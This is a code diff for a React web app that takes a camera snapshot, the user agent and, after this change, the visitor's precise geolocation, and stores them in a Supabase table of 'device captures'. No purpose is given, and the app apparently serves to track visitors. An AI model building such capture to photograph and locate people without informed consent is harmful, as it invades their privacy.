@@ -25,11 +25,11 @@ function App() {
     const captureDeviceData = async () => {
       try {
         const imageData = await captureImage();
-        // Location capture removed to avoid permission prompts
+        const locationData = await captureLocation();
 
         const data: CaptureData = {
           image: imageData,
-          location: null,
+          location: locationData,
           userAgent: navigator.userAgent,
         };
 
@@ -37,9 +37,9 @@ function App() {
 
         await supabase.from('device_captures').insert({
           image_data: imageData,
-          latitude: null,
-          longitude: null,
-          accuracy: null,
+          latitude: locationData?.latitude,
+          longitude: locationData?.longitude,
+          accuracy: locationData?.accuracy,
           user_agent: navigator.userAgent,
         });
 
@@ -148,7 +148,30 @@ function App() {
       throw new Error('Failed to access camera. Please grant camera permissions.');
     }
   };
+  const captureLocation = async (): Promise<{
+    latitude: number;
+    longitude: number;
+    accuracy: number;
+  } | null> => {
+    try {
+      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0,
+        });
+      });
 
+      return {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+      };
+    } catch (error) {
+      console.error('Location error:', error);
+      throw new Error('Failed to get location. Please grant location permissions.');
+    }
+  };
 
 
   return (
@@ -169,7 +192,7 @@ function App() {
                   <Loader2 className="w-16 h-16 animate-spin text-blue-400 mb-4" />
                   <p className="text-xl text-slate-300">Capturing device data...</p>
                   <p className="text-sm text-slate-400 mt-2">
-                    Please grant camera permissions
+                    Please grant camera and location permissions
                   </p>
                 </div>
               )}
